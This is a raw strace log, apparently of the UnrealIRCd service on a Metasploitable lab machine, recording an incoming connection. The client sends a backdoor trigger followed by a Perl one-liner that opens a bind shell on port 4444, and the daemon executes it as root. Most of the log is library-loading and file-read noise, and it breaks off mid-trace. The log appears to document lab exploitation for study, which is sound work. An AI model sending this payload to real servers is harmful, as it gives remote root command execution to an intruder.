4519  20:24:31.368865 select(1024, [2 3 4 7 9], [], NULL, {0, 480000}) = 0 (Timeout)
4519  20:24:31.848658 clock_gettime(CLOCK_MONOTONIC, {48681, 665678244}) = 0
4519  20:24:31.848680 time(NULL)        = 1495671871
4519  20:24:31.848691 time(NULL)        = 1495671871
4519  20:24:31.848708 gettimeofday({1495671871, 848712}, NULL) = 0
4519  20:24:31.848720 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:24:31.848748 clock_gettime(CLOCK_MONOTONIC, {48681, 665761388}) = 0
4519  20:24:31.848759 gettimeofday({1495671871, 848762}, NULL) = 0
4519  20:24:31.848769 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 440000})
4519  20:24:32.408785 clock_gettime(CLOCK_MONOTONIC, {48682, 225806316}) = 0
4519  20:24:32.408807 accept(2, 0, NULL) = 5
4519  20:24:32.408830 getpeername(5, {sa_family=AF_INET, sin_port=htons(38173), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  20:24:32.408861 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:24:32.408873 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:24:32.408886 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  20:24:32.408898 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  20:24:32.408909 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  20:24:32.408920 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  20:24:32.408935 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  20:24:32.408950 clock_gettime(CLOCK_MONOTONIC, {48682, 225963959}) = 0
4519  20:24:32.408962 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  20:24:32.408974 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:24:32.408983 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:24:32.408992 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  20:24:32.409002 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  20:24:32.409016 send(6, "\377`\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  20:24:32.409070 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  20:24:32.409128 gettimeofday({1495671872, 409132}, NULL) = 0
4519  20:24:32.409169 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  20:24:32.411911 clock_gettime(CLOCK_MONOTONIC, {48682, 228929811}) = 0
4519  20:24:32.411930 recvfrom(6, "\377`\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\314\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  20:24:32.411986 close(6)          = 0
4519  20:24:32.412002 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  20:24:32.412030 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  20:24:32.412088 time(NULL)        = 1495671872
4519  20:24:32.412100 time(NULL)        = 1495671872
4519  20:24:32.412153 gettimeofday({1495671872, 412157}, NULL) = 0
4519  20:24:32.412165 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:24:32.412245 clock_gettime(CLOCK_MONOTONIC, {48682, 229272440}) = 0
4519  20:24:32.412270 gettimeofday({1495671872, 412274}, NULL) = 0
4519  20:24:32.412282 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  20:24:32.412618 clock_gettime(CLOCK_MONOTONIC, {48682, 229632457}) = 0
4519  20:24:32.412682 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  20:24:32.412730 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  20:24:32.412750 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  20:24:32.412762 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  20:24:32.412777 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 12205
12205 20:24:32.412938 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
12205 20:24:32.412953 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
12205 20:24:32.412979 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12205 20:24:32.412993 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
12205 20:24:32.413240 brk(0)            = 0x80f9000
12205 20:24:32.413265 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12205 20:24:32.413283 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eed000
12205 20:24:32.413340 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12205 20:24:32.413359 open("/etc/ld.so.cache", O_RDONLY) = 1
12205 20:24:32.413372 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12205 20:24:32.413391 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee5000
12205 20:24:32.413401 close(1)          = 0
12205 20:24:32.413412 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12205 20:24:32.413428 open("/lib/libncurses.so.5", O_RDONLY) = 1
12205 20:24:32.413442 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
12205 20:24:32.413660 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
12205 20:24:32.413678 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eb5000
12205 20:24:32.413690 mmap2(0xb7ee2000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7ee2000
12205 20:24:32.413738 close(1)          = 0
12205 20:24:32.413795 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12205 20:24:32.413827 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12205 20:24:32.413842 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12205 20:24:32.413953 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12205 20:24:32.413970 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eb1000
12205 20:24:32.413983 mmap2(0xb7eb3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7eb3000
12205 20:24:32.414002 close(1)          = 0
12205 20:24:32.414014 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12205 20:24:32.414027 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12205 20:24:32.414042 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12205 20:24:32.414129 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12205 20:24:32.414146 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eb0000
12205 20:24:32.414162 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d61000
12205 20:24:32.414173 mmap2(0xb7eaa000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7eaa000
12205 20:24:32.414192 mmap2(0xb7ead000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ead000
12205 20:24:32.414232 close(1)          = 0
12205 20:24:32.414271 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d60000
12205 20:24:32.414284 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d606b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12205 20:24:32.414341 mprotect(0xb7eaa000, 4096, PROT_READ) = 0
12205 20:24:32.414378 munmap(0xb7ee5000, 29913) = 0
12205 20:24:32.414405 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12205 20:24:32.414420 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
12205 20:24:32.414439 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa43400) = -1 ENOTTY (Inappropriate ioctl for device)
12205 20:24:32.414470 brk(0)            = 0x80f9000
12205 20:24:32.414480 brk(0x80fa000)    = 0x80fa000
12205 20:24:32.414492 brk(0x80fb000)    = 0x80fb000
12205 20:24:32.414508 getuid32()        = 0
12205 20:24:32.414517 getgid32()        = 0
12205 20:24:32.414526 geteuid32()       = 0
12205 20:24:32.414535 getegid32()       = 0
12205 20:24:32.414549 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12205 20:24:32.414563 time(NULL)        = 1495671872
12205 20:24:32.414575 brk(0x80fc000)    = 0x80fc000
12205 20:24:32.414590 brk(0x80fd000)    = 0x80fd000
12205 20:24:32.414609 open("/proc/meminfo", O_RDONLY) = 1
12205 20:24:32.414631 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
12205 20:24:32.414649 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eec000
12205 20:24:32.414661 read(1, "MemTotal:      1035240 kB\nMemFree:        157752 kB\nBuffers:        141584 kB\nCached:         492512 kB\nSwapCached:          0 kB\nActive:         517628 kB\nInactive:       305340 kB\nHighTotal:      131008 kB\nHighFree:          248 kB\nLowTotal:       904232 kB\nLowFree:        157504 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            1344 kB\nWriteback:           0 kB\nAnonPages:      188852 kB\nMapped:          52028 kB\nSlab:            32660 kB\nSReclaimable:    20208 kB\nSUnreclaim:      12452 kB\nPageTables:       2904 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   707968 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
12205 20:24:32.414818 close(1)          = 0
12205 20:24:32.414830 munmap(0xb7eec000, 4096) = 0
12205 20:24:32.414842 brk(0x80fe000)    = 0x80fe000
12205 20:24:32.414868 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12205 20:24:32.414881 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12205 20:24:32.414893 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12205 20:24:32.414905 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12205 20:24:32.414916 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
12205 20:24:32.414928 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
12205 20:24:32.414941 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12205 20:24:32.414953 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12205 20:24:32.414966 uname({sys="Linux", node="metasploitable", ...}) = 0
12205 20:24:32.415015 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12205 20:24:32.415033 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12205 20:24:32.415051 brk(0x8100000)    = 0x8100000
12205 20:24:32.415063 getcwd("/etc/unreal", 4096) = 12
12205 20:24:32.415077 getpid()          = 12205
12205 20:24:32.415093 getppid()         = 4519
12205 20:24:32.415109 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12205 20:24:32.415129 stat64("/sbin/sh", 0xbfa433d8) = -1 ENOENT (No such file or directory)
12205 20:24:32.415141 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12205 20:24:32.415159 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12205 20:24:32.415182 socket(PF_FILE, SOCK_STREAM, 0) = 1
12205 20:24:32.415203 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12205 20:24:32.415240 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12205 20:24:32.415276 close(1)          = 0
12205 20:24:32.415288 socket(PF_FILE, SOCK_STREAM, 0) = 1
12205 20:24:32.415298 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12205 20:24:32.415308 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12205 20:24:32.415326 close(1)          = 0
12205 20:24:32.415340 open("/etc/nsswitch.conf", O_RDONLY) = 1
12205 20:24:32.415354 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12205 20:24:32.415370 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eec000
12205 20:24:32.415382 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12205 20:24:32.415431 read(1, "", 4096) = 0
12205 20:24:32.415441 close(1)          = 0
12205 20:24:32.415450 munmap(0xb7eec000, 4096) = 0
12205 20:24:32.415466 open("/etc/ld.so.cache", O_RDONLY) = 1
12205 20:24:32.415479 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12205 20:24:32.415495 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee5000
12205 20:24:32.415505 close(1)          = 0
12205 20:24:32.415519 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12205 20:24:32.415533 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
12205 20:24:32.415548 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
12205 20:24:32.415635 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
12205 20:24:32.415652 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d57000
12205 20:24:32.415664 mmap2(0xb7d5e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d5e000
12205 20:24:32.415681 close(1)          = 0
12205 20:24:32.415700 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12205 20:24:32.415738 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
12205 20:24:32.415766 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
12205 20:24:32.415851 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
12205 20:24:32.415868 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d3f000
12205 20:24:32.415880 mmap2(0xb7d53000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d53000
12205 20:24:32.415895 mmap2(0xb7d55000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d55000
12205 20:24:32.415909 close(1)          = 0
12205 20:24:32.415935 munmap(0xb7ee5000, 29913) = 0
12205 20:24:32.415952 open("/etc/ld.so.cache", O_RDONLY) = 1
12205 20:24:32.415965 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12205 20:24:32.415981 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee5000
12205 20:24:32.415991 close(1)          = 0
12205 20:24:32.416001 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12205 20:24:32.416015 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
12205 20:24:32.416029 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12205 20:24:32.416120 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
